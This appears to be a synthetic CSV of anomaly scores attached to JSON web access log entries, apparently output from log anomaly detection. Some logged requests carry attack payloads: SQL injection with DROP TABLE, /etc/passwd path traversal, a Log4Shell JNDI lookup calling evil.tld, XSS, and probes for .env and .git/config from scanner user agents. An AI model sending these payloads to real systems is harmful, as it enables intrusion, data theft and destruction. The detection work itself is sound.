score_content,score_session,score_fused,score_fused_norm,line
71.95755004882812,,71.95755004882812,71.95755004882812,{"remote_addr": "94.185.161.5", "time_local": "11/Jan/2025:09:01:04 -0700", "request": "OPTIONS /login HTTP/2", "status": 200, "body_bytes_sent": 4901, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
2.010206460952759,,2.010206460952759,2.010206460952759,{"remote_addr": "198.81.26.8", "time_local": "11/Jan/2025:09:01:05 -0700", "request": "GET /logout HTTP/2", "status": 204, "body_bytes_sent": 12761, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
46.77239990234375,,46.77239990234375,46.77239990234375,{"remote_addr": "15.57.88.182", "time_local": "11/Jan/2025:09:01:05 -0700", "request": "HEAD / HTTP/2", "status": 200, "body_bytes_sent": 3500, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
103.08892059326172,,103.08892059326172,103.08892059326172,{"remote_addr": "203.31.249.190", "time_local": "11/Jan/2025:09:01:06 -0700", "request": "TRACE /about HTTP/2", "status": 200, "body_bytes_sent": 12619, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
24.05377197265625,,24.05377197265625,24.05377197265625,{"remote_addr": "52.159.160.117", "time_local": "11/Jan/2025:09:01:07 -0700", "request": "GET /api/user?id=1;DROP TABLE users HTTP/2", "status": 200, "body_bytes_sent": 11183, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
30247.45703125,,30247.45703125,30247.45703125,{"remote_addr": "128.56.52.157", "time_local": "11/Jan/2025:09:01:07 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 404, "body_bytes_sent": 59, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
71.13113403320312,,71.13113403320312,71.13113403320312,{"remote_addr": "56.28.48.65", "time_local": "11/Jan/2025:09:01:08 -0700", "request": "HEAD /search?q=router HTTP/2", "status": 301, "body_bytes_sent": 9965, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
68.56684875488281,,68.56684875488281,68.56684875488281,{"remote_addr": "6.188.137.33", "time_local": "11/Jan/2025:09:01:09 -0700", "request": "HEAD /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 15004, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
72.00312805175781,,72.00312805175781,72.00312805175781,{"remote_addr": "152.183.13.20", "time_local": "11/Jan/2025:09:01:09 -0700", "request": "OPTIONS /admin HTTP/2", "status": 200, "body_bytes_sent": 17936, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
25.049711227416992,,25.049711227416992,25.049711227416992,{"remote_addr": "250.144.178.15", "time_local": "11/Jan/2025:09:01:10 -0700", "request": "DELETE /../../etc/passwd HTTP/2", "status": 201, "body_bytes_sent": 3566, "http_referer": "-", "http_user_agent": "dirb/2.22"}
34.993377685546875,,34.993377685546875,34.993377685546875,{"remote_addr": "73.173.67.196", "time_local": "11/Jan/2025:09:01:10 -0700", "request": "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 15235, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
2.9420769214630127,,2.9420769214630127,2.9420769214630127,{"remote_addr": "135.13.17.36", "time_local": "11/Jan/2025:09:01:11 -0700", "request": "POST /.git/config HTTP/2", "status": 200, "body_bytes_sent": 15271, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
71.92607879638672,,71.92607879638672,71.92607879638672,{"remote_addr": "121.84.226.10", "time_local": "11/Jan/2025:09:01:11 -0700", "request": "OPTIONS /logout HTTP/2", "status": 200, "body_bytes_sent": 661, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
26.819887161254883,,26.819887161254883,26.819887161254883,{"remote_addr": "77.211.124.173", "time_local": "11/Jan/2025:09:01:11 -0700", "request": "DELETE /profile HTTP/2", "status": 200, "body_bytes_sent": 12200, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
71.96334838867188,,71.96334838867188,71.96334838867188,{"remote_addr": "90.254.161.150", "time_local": "11/Jan/2025:09:01:12 -0700", "request": "OPTIONS /login HTTP/2", "status": 200, "body_bytes_sent": 6304, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
4.546560764312744,,4.546560764312744,4.546560764312744,{"remote_addr": "156.171.91.211", "time_local": "11/Jan/2025:09:01:12 -0700", "request": "POST /contact HTTP/2", "status": 204, "body_bytes_sent": 11007, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
26.82672119140625,,26.82672119140625,26.82672119140625,{"remote_addr": "182.119.60.175", "time_local": "11/Jan/2025:09:01:13 -0700", "request": "DELETE /contact HTTP/2", "status": 200, "body_bytes_sent": 14263, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
0.29785454273223877,,0.29785454273223877,0.29785454273223877,{"remote_addr": "100.2.45.29", "time_local": "11/Jan/2025:09:01:14 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 12198, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
4.600468158721924,,4.600468158721924,4.600468158721924,{"remote_addr": "146.146.48.55", "time_local": "11/Jan/2025:09:01:15 -0700", "request": "POST /logout HTTP/2", "status": 200, "body_bytes_sent": 14285, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
125.03581237792969,,125.03581237792969,125.03581237792969,{"remote_addr": "31.104.197.101", "time_local": "11/Jan/2025:09:01:15 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 7096, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
24.029176712036133,,24.029176712036133,24.029176712036133,{"remote_addr": "218.231.56.164", "time_local": "11/Jan/2025:09:01:16 -0700", "request": "GET /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 9972, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
30128.26953125,,30128.26953125,30128.26953125,{"remote_addr": "170.32.45.118", "time_local": "11/Jan/2025:09:01:16 -0700", "request": "POST /login HTTP/2", "status": 404, "body_bytes_sent": 560, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
14.136280059814453,,14.136280059814453,14.136280059814453,{"remote_addr": "159.30.7.203", "time_local": "11/Jan/2025:09:01:17 -0700", "request": "PUT /.env HTTP/2", "status": 304, "body_bytes_sent": 14551, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
4.8647613525390625,,4.8647613525390625,4.8647613525390625,{"remote_addr": "9.28.11.10", "time_local": "11/Jan/2025:09:01:18 -0700", "request": "POST / HTTP/2", "status": 200, "body_bytes_sent": 17305, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.8729466199874878,,1.8729466199874878,1.8729466199874878,{"remote_addr": "180.192.241.57", "time_local": "11/Jan/2025:09:01:19 -0700", "request": "GET /api/products HTTP/2", "status": 200, "body_bytes_sent": 6120, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
103.01105499267578,,103.01105499267578,103.01105499267578,{"remote_addr": "241.168.33.46", "time_local": "11/Jan/2025:09:01:20 -0700", "request": "TRACE /contact HTTP/2", "status": 200, "body_bytes_sent": 11750, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
2.8640832901000977,,2.8640832901000977,2.8640832901000977,{"remote_addr": "78.52.19.216", "time_local": "11/Jan/2025:09:01:20 -0700", "request": "GET /cgi-bin/test.cgi HTTP/2", "status": 302, "body_bytes_sent": 12552, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
26.586585998535156,,26.586585998535156,26.586585998535156,{"remote_addr": "76.149.44.200", "time_local": "11/Jan/2025:09:01:21 -0700", "request": "POST /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 3070, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
51.4443244934082,,51.4443244934082,51.4443244934082,{"remote_addr": "15.75.189.113", "time_local": "11/Jan/2025:09:01:22 -0700", "request": "DELETE /search?q=monitor HTTP/2", "status": 301, "body_bytes_sent": 16173, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
125.055908203125,,125.055908203125,125.055908203125,{"remote_addr": "84.218.112.159", "time_local": "11/Jan/2025:09:01:23 -0700", "request": "TRACE /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 12654, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
71.14077758789062,,71.14077758789062,71.14077758789062,{"remote_addr": "66.113.105.41", "time_local": "11/Jan/2025:09:01:24 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 302, "body_bytes_sent": 1198, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
11038.1220703125,,11038.1220703125,11038.1220703125,{"remote_addr": "67.138.18.122", "time_local": "11/Jan/2025:09:01:24 -0700", "request": "GET /logout HTTP/2", "status": 500, "body_bytes_sent": 884, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
46.57663345336914,,46.57663345336914,46.57663345336914,{"remote_addr": "104.215.87.64", "time_local": "11/Jan/2025:09:01:25 -0700", "request": "HEAD /about HTTP/2", "status": 200, "body_bytes_sent": 8541, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
70.10860443115234,,70.10860443115234,70.10860443115234,{"remote_addr": "124.142.80.7", "time_local": "11/Jan/2025:09:01:25 -0700", "request": "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 15731, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
29.418537139892578,,29.418537139892578,29.418537139892578,{"remote_addr": "95.128.25.38", "time_local": "11/Jan/2025:09:01:26 -0700", "request": "DELETE /profile HTTP/2", "status": 302, "body_bytes_sent": 7730, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
102.9484634399414,,102.9484634399414,102.9484634399414,{"remote_addr": "174.181.221.213", "time_local": "11/Jan/2025:09:01:26 -0700", "request": "TRACE /dashboard HTTP/2", "status": 200, "body_bytes_sent": 13440, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
44.90559387207031,,44.90559387207031,44.90559387207031,{"remote_addr": "194.240.128.157", "time_local": "11/Jan/2025:09:01:27 -0700", "request": "HEAD /index.html HTTP/2", "status": 200, "body_bytes_sent": 2488, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
68.73310852050781,,68.73310852050781,68.73310852050781,{"remote_addr": "251.213.87.181", "time_local": "11/Jan/2025:09:01:28 -0700", "request": "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 10172, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
25.239707946777344,,25.239707946777344,25.239707946777344,{"remote_addr": "90.17.79.171", "time_local": "11/Jan/2025:09:01:28 -0700", "request": "DELETE /index.html HTTP/2", "status": 200, "body_bytes_sent": 12045, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.9834575653076172,,1.9834575653076172,1.9834575653076172,{"remote_addr": "127.220.139.40", "time_local": "11/Jan/2025:09:01:29 -0700", "request": "GET /profile HTTP/2", "status": 204, "body_bytes_sent": 15794, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
0.270498126745224,,0.270498126745224,0.270498126745224,{"remote_addr": "189.55.83.217", "time_local": "11/Jan/2025:09:01:29 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 11507, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
70.09565734863281,,70.09565734863281,70.09565734863281,{"remote_addr": "68.79.50.240", "time_local": "11/Jan/2025:09:01:30 -0700", "request": "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 11661, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
29.183155059814453,,29.183155059814453,29.183155059814453,{"remote_addr": "221.8.238.117", "time_local": "11/Jan/2025:09:01:31 -0700", "request": "POST /search?q=laptop HTTP/2", "status": 301, "body_bytes_sent": 6904, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
34.79362869262695,,34.79362869262695,34.79362869262695,{"remote_addr": "39.84.194.77", "time_local": "11/Jan/2025:09:01:31 -0700", "request": "PUT /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 1032, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
12.903820991516113,,12.903820991516113,12.903820991516113,{"remote_addr": "19.232.133.65", "time_local": "11/Jan/2025:09:01:32 -0700", "request": "PUT /about HTTP/2", "status": 200, "body_bytes_sent": 10844, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
26.585893630981445,,26.585893630981445,26.585893630981445,{"remote_addr": "125.30.107.222", "time_local": "11/Jan/2025:09:01:32 -0700", "request": "POST /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 2853, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
125.05644226074219,,125.05644226074219,125.05644226074219,{"remote_addr": "59.150.119.171", "time_local": "11/Jan/2025:09:01:33 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 12814, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
102.81779479980469,,102.81779479980469,102.81779479980469,{"remote_addr": "173.146.97.143", "time_local": "11/Jan/2025:09:01:33 -0700", "request": "TRACE /server-status HTTP/2", "status": 200, "body_bytes_sent": 475, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
0.23338675498962402,,0.23338675498962402,0.23338675498962402,{"remote_addr": "232.33.210.120", "time_local": "11/Jan/2025:09:01:34 -0700", "request": "GET /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 13717, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
2.9092483520507812,,2.9092483520507812,2.9092483520507812,{"remote_addr": "63.178.179.223", "time_local": "11/Jan/2025:09:01:35 -0700", "request": "GET /assets/app.css HTTP/2", "status": 302, "body_bytes_sent": 12681, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
2.9079742431640625,,2.9079742431640625,2.9079742431640625,{"remote_addr": "201.139.29.171", "time_local": "11/Jan/2025:09:01:35 -0700", "request": "GET /assets/app.js HTTP/2", "status": 302, "body_bytes_sent": 5949, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
30191.1875,,30191.1875,30191.1875,{"remote_addr": "168.21.76.136", "time_local": "11/Jan/2025:09:01:36 -0700", "request": "HEAD /search?q=laptop HTTP/2", "status": 403, "body_bytes_sent": 1170, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
124.98749542236328,,124.98749542236328,124.98749542236328,{"remote_addr": "164.176.105.24", "time_local": "11/Jan/2025:09:01:37 -0700", "request": "TRACE /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 15221, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
103.06185913085938,,103.06185913085938,103.06185913085938,{"remote_addr": "127.63.220.240", "time_local": "11/Jan/2025:09:01:37 -0700", "request": "TRACE /login HTTP/2", "status": 200, "body_bytes_sent": 5422, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
4.557922840118408,,4.557922840118408,4.557922840118408,{"remote_addr": "100.108.120.182", "time_local": "11/Jan/2025:09:01:39 -0700", "request": "POST /profile HTTP/2", "status": 200, "body_bytes_sent": 12504, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
4.478796482086182,,4.478796482086182,4.478796482086182,{"remote_addr": "189.2.78.233", "time_local": "11/Jan/2025:09:01:39 -0700", "request": "POST /dashboard HTTP/2", "status": 200, "body_bytes_sent": 9498, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
96.65303039550781,,96.65303039550781,96.65303039550781,{"remote_addr": "193.161.203.214", "time_local": "11/Jan/2025:09:01:40 -0700", "request": "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 304, "body_bytes_sent": 5781, "http_referer": "-", "http_user_agent": "dirb/2.22"}
4.519006252288818,,4.519006252288818,4.519006252288818,{"remote_addr": "63.99.105.40", "time_local": "11/Jan/2025:09:01:41 -0700", "request": "POST /profile HTTP/2", "status": 200, "body_bytes_sent": 2561, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
24.108070373535156,,24.108070373535156,24.108070373535156,{"remote_addr": "85.237.34.142", "time_local": "11/Jan/2025:09:01:42 -0700", "request": "GET /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 11123, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
4.46333122253418,,4.46333122253418,4.46333122253418,{"remote_addr": "138.227.41.201", "time_local": "11/Jan/2025:09:01:43 -0700", "request": "POST /api/products HTTP/2", "status": 200, "body_bytes_sent": 8677, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
